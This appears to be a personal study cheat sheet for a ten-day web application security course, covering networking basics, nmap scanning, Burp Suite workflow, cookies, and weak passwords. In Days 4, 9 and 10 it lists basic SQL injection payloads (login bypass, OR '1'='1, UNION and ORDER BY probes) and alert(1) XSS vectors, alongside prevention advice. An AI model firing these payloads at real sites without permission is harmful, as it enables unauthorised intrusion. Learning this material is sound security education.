# 📘 Master Cheat Sheet (Days 1–10)

# Web Application Security Foundations Cheat Sheet
## Covers Days 1–10 of the Web Application Security Roadmap

---

# 🌐 Day 1 — Internet Basics

## IP Address
Unique numerical identifier assigned to a device on a network.

### Example
- IPv4: 192.168.1.10
- Public IP: 8.8.8.8

## DNS (Domain Name System)
Converts domain names into IP addresses.

### Example
google.com → 142.250.x.x

## What Happens When Opening a Website
1. Browser checks DNS cache.
2. DNS resolves domain to IP.
3. Browser connects to server.
4. HTTP/HTTPS request is sent.
5. Server responds.
6. Browser renders HTML, CSS, and JavaScript.

## Commands
### ping
Tests connectivity.
```bash
ping google.com
````

### nslookup

Resolves domains to IP addresses.

```bash
nslookup google.com
```

### ipconfig

Shows network configuration (Windows).

```bash
ipconfig
```

---

# 🌐 Day 2 — Ports and Protocols

## Common Ports

| Port | Protocol | Purpose            |
| ---- | -------- | ------------------ |
| 21   | FTP      | File Transfer      |
| 22   | SSH      | Secure Shell       |
| 23   | Telnet   | Remote access      |
| 25   | SMTP     | Email sending      |
| 53   | DNS      | Name resolution    |
| 80   | HTTP     | Web traffic        |
| 110  | POP3     | Email retrieval    |
| 143  | IMAP     | Email retrieval    |
| 443  | HTTPS    | Secure web traffic |
| 3306 | MySQL    | Database           |
| 3389 | RDP      | Remote Desktop     |

## Nmap Basics

```bash
nmap <target>
nmap -sV <target>
nmap -A <target>
nmap -p 80,443 <target>
```

---

# 🌐 Day 3 — HTTP Fundamentals

## HTTP Request Structure

* Method
* Path
* Headers
* Body

## HTTP Response Structure

* Status line
* Headers
* Body

## Common Methods

* GET
* POST
* PUT
* DELETE

## Developer Tools Tabs

* Elements
* Network
* Console
* Storage/Application

---

# 🌐 Day 4 — Parameters and SQL Injection Basics

## GET Parameter Example

```text
https://example.com/product?id=5
```

## POST Parameter Example

```text
username=admin&password=test
```

## SQL Injection Concept

User input changes the SQL query.

## Login Bypass Payload

```sql
administrator'--
```

## Comment Syntax

```sql
--
```

Ignores the rest of the SQL query.

---

# 🌐 Day 5 — Status Codes, Headers, and WordPress

## HTTP Status Codes

| Code | Meaning               |
| ---- | --------------------- |
| 200  | OK                    |
| 301  | Redirect              |
| 302  | Temporary Redirect    |
| 403  | Forbidden             |
| 404  | Not Found             |
| 500  | Internal Server Error |

## WordPress Indicators

* /wp-login.php
* /wp-admin/
* /wp-content/
* /wp-includes/

## PHP Version Header

```http
X-Powered-By: PHP/8.2.30
```

## Cookie Attributes

* HttpOnly
* Secure
* SameSite

---

# 🌐 Day 6 — Burp Suite Fundamentals

## Main Tabs

* Proxy
* Intercept
* HTTP History
* Repeater

## Workflow

1. Intercept request.
2. Modify parameters.
3. Forward request.
4. Send to Repeater.
5. Analyze response.

## Common Shortcut

Ctrl + R → Send to Repeater

---

# 🌐 Day 7 — Sessions, Cookies, Authentication

## Session Cookie Example

```http
rack.session=...
```

## Authentication Flow

1. User submits credentials.
2. Server validates.
3. Server issues session cookie.
4. Browser sends cookie with future requests.

## Cookie Indicators

* Session value changes after login.
* Cookie removed after logout.

---

# 🌐 Day 8 — Weak Passwords and Brute Force

## Weak Password Examples

* 123456
* password
* qwerty
* admin123
* pakistan123

## Brute Force

Trying many credential combinations.

## Indicators

* Different response length
* Different message
* Redirect after success

---

# 🌐 Day 9 — SQL Injection Fundamentals

## Error-Based SQLi

Input causes database error.

## UNION-Based SQLi

Combines attacker-controlled query with original query.

## Common Payloads

```sql
'
' OR '1'='1
'--
' UNION SELECT NULL,NULL--
```

## Column Count Detection

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

---

# 🌐 Day 10 — Cross-Site Scripting (XSS)

## XSS Types

* Reflected XSS
* Stored XSS
* DOM-Based XSS

## Common Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Attribute Context Payload

```html
" onmouseover="alert(1)
```

## JavaScript String Payload

```javascript
";alert(1);//
```

## Source and Sink

### Sources

* location.search
* Form input
* URL parameters

### Sinks

* innerHTML
* document.write
* eval()

## Prevention

* Output encoding
* Input sanitization
* textContent instead of innerHTML
* Content Security Policy (CSP)

---

# 🍪 Important Cookie Attributes

| Attribute | Meaning                           |
| --------- | --------------------------------- |
| HttpOnly  | JavaScript cannot read the cookie |
| Secure    | Sent only over HTTPS              |
| SameSite  | Restricts cross-site sending      |

---

# 🔐 Security Headers

| Header                  | Purpose               |
| ----------------------- | --------------------- |
| X-Frame-Options         | Prevent clickjacking  |
| Content-Security-Policy | Restrict scripts      |
| X-Content-Type-Options  | Prevent MIME sniffing |

---

# 🧰 Useful Burp Workflow

1. Intercept request.
2. Analyze URL, headers, cookies, parameters.
3. Modify parameter.
4. Forward or send to Repeater.
5. Compare responses.

---

# 📋 Pentester Checklist

For every input field ask:

* Is my input reflected?
* Is it stored?
* Can I modify parameters?
* Can I inject SQL?
* Can I inject HTML?
* Can JavaScript execute?
* Are cookies set?
* Are security headers present?

---

# 🧠 OWASP Top 10 Topics Covered So Far

* Injection (SQL Injection)
* Cross-Site Scripting (XSS)
* Identification and Authentication Failures
* Security Misconfiguration

---

